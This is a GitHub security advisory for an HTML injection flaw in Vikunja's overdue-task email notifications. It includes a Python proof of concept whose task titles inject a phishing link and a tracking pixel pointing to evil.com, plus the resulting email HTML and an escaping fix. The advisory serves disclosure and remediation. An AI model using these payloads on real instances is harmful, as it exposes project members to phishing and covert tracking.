# [M] Vikunja has HTML Injection via Task Titles in Overdue Email Notifications

## Summary
Severity: Medium
Advisory: GHSA-45q4-x4r9-8fqj
CVE: CVE-2026-35600
CWE: CWE-79
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-04-10
Source: https://github.com/advisories/GHSA-45q4-x4r9-8fqj
Type: github-advisory

## Affected
- Go: `code.vikunja.io/api` — affected >=0 <2.3.0

## Details
## Summary

Task titles are embedded directly into Markdown link syntax in overdue email notifications without escaping Markdown special characters. When rendered by goldmark and sanitized by bluemonday (which allows `<a>` and `<img>` tags), injected Markdown constructs produce phishing links and tracking pixels in legitimate notification emails.

## Details

The overdue task notification at `pkg/models/notifications.go:360` constructs a Markdown list entry:

```go
overdueLine += `* [` + task.Title + `](` + config.ServicePublicURL.GetString() + "tasks/" + strconv.FormatInt(task.ID, 10) + `) ...`
```

The task title is placed inside Markdown link syntax `[TITLE](URL)`. A title containing `]` and `[` breaks the link structure. The assembled Markdown is converted to HTML by goldmark at `pkg/notifications/mail_render.go:214`, then sanitized by bluemonday's UGCPolicy. Since UGCPolicy intentionally allows `<a href>` and `<img src>` with http/https URLs, the injected links and images survive sanitization and reach the email recipient.

The same pattern affects multiple notification types at `notifications.go` lines 72, 176, 227, and 318.

## Proof of Concept

Tested on Vikunja v2.2.2 with SMTP enabled (MailHog as sink).

```python
import requests

TARGET = "http://localhost:3456"
API = f"{TARGET}/api/v1"

token = requests.post(f"{API}/login",
    json={"username": "alice", "password": "Alice1234!"}).json()["token"]
h = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}

proj = requests.put(f"{API}/projects", headers=h, json={"title": "Shared"}).json()

# create task with markdown injection in title + past due date
requests.put(f"{API}/projects/{proj['id']}/tasks", headers=h, json={
    "title": 'test](https://evil.com) [Click to verify your account',
    "due_date": "2026-03-26T00:00:00Z"})

# create task with tracking pixel injection
requests.put(f"{API}/projects/{proj['id']}/tasks", headers=h, json={
    "title": '![](https://evil.com/track.png?user=bob)',
    "due_date": "2026-03-26T00:00:00Z"})

# enable overdue reminders for the user
requests.post(f"{API}/user/settings/general", headers=h, json={
    "email_reminders_enabled": True,
    "overdue_tasks_reminders_enabled": True,
    "overdue_tasks_reminders_time": "09:00"})

# wait for the overdue notification cron to fire, then inspect the email
```

The overdue notification email HTML contains:
```html
<li>
  <a href="https://evil.com">test</a>
  <a href="http://vikunja.example/tasks/5">Click to verify your account</a>
  (Shared), since one day
</li>
<li>
  <a href="http://vikunja.example/tasks/6">
    <img src="https://evil.com/track.png?user=bob">
  </a>
  (Shared), since one day
</li>
```

The attacker's `evil.com` link appears as a clickable link in a legitimate Vikunja notification email. The tracking pixel loads when the email is opened.

## Impact

An attacker with write access to a shared project can craft task titles that inject phishing links or tracking images into overdue email notifications sent to other project members. Because these links appear within legitimate Vikunja notification emails from the configured SMTP server, recipients are more likely to trust and click them.

## Recommended Fix

Escape Markdown special characters in task titles before embedding them in Markdown content:

```go
func escapeMarkdown(s string) string {
    replacer := strings.NewReplacer(
        "[", "\\[", "]", "\\]",
        "(", "\\(", ")", "\\)",
        "!", "\\!", "`", "\\`",
        "*", "\\*", "_", "\\_",
        "#", "\\#",
    )
    return replacer.Replace(s)
}
```

---
*Found and reported by [aisafe.io](https://aisafe.io)*

## References
- https://github.com/go-vikunja/vikunja/security/advisories/GHSA-45q4-x4r9-8fqj
- https://nvd.nist.gov/vuln/detail/CVE-2026-35600
- https://github.com/go-vikunja/vikunja/pull/2580
- https://github.com/go-vikunja/vikunja/commit/0f3730d045f20e261e3cdfc6d93c325653395b64
- https://github.com/go-vikunja/vikunja
- https://github.com/go-vikunja/vikunja/releases/tag/v2.3.0
